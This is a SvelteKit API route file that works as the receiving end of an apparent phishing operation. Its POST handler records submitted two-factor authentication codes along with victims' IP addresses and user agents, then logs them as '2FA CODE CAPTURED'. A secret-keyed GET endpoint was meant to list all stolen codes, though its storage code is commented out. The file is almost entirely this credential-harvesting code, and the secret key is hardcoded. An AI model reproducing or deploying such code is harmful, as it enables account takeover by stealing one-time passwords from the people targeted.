// @ts-nocheck
import { json } from '@sveltejs/kit';
// import fs from 'fs';
import path from 'path';

const SECRET_KEY = 'abxSecre43edoc';
const DATA_FILE = path.join(process.cwd(), 'captured_data.json');

// Load existing data from file
// function loadData() {
//     try {
//         if (fs.existsSync(DATA_FILE)) {
//             const data = fs.readFileSync(DATA_FILE, 'utf-8');
//             return JSON.parse(data);
//         }
//     } catch (e) {
//         console.error('Error loading data:', e);
//     }
//     return [];
// }

// Save data to file
// function saveData(data) {
//     try {
//         fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
//     } catch (e) {
//         console.error('Error saving data:', e);
//     }
// }

export async function POST({ request }) {
    try {
        const data = await request.json();
        const { code, timestamp, userAgent } = data;
        
        const ip = request.headers.get('x-forwarded-for') || 
                   request.headers.get('x-real-ip') || 
                   '127.0.0.1';
        
        const newCode = {
            code,
            timestamp,
            userAgent: userAgent || 'Unknown',
            ip: ip,
            receivedAt: new Date().toISOString()
        };
        
        // Load existing, add new, save
        // const existingData = loadData();
        // existingData.unshift(newCode);
        // saveData(existingData);
        
        console.log('\n🔐 ========== 2FA CODE CAPTURED ==========');
        console.log(`📱 Code: ${code}`);
        console.log(`⏰ Time: ${timestamp}`);
        console.log(`🌐 IP: ${ip}`);
        // console.log(`💾 Total captured: ${existingData.length}`);
        console.log('🔐 ========================================\n');
        
        return json({ success: true });
        
    } catch (error) {
        console.error('Error:', error);
        return json({ success: false, error: error.message }, { status: 500 });
    }
}

export async function GET({ url }) {
    const secret = url.searchParams.get('secret');
    
    if (secret !== SECRET_KEY) {
        return json({ error: 'Unauthorized' }, { status: 401 });
    }
    
    // const data = loadData();
    
    // return json({ 
    //     total: data.length,
    //     codes: data 
    // });
}
